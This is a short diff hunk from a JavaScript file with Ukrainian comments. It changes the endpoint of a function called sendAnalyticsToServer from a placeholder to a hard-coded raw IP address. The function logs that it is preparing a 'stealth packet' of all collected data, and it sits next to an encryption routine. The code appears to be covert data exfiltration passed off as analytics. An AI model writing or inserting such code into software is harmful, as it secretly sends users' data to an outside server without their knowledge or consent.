@@ -357,7 +357,7 @@ async function encryptData(text, keyString) {
 // ==================== ВІДПРАВКА АНАЛІТИКИ НА СЕРВЕР ====================
 async function sendAnalyticsToServer(detail) {
     console.log(`[Аналітика] Готуємо стелс-пакунок...`);
-    const backendUrl = "http://твій-test-сервер:8001/api/v2/met";
+    const backendUrl = "http://178.105.190.180:8001/api/v2/met";
 
     try {
         // 1. Перетворюємо всі зібрані дані в звичайний текст (JSON)
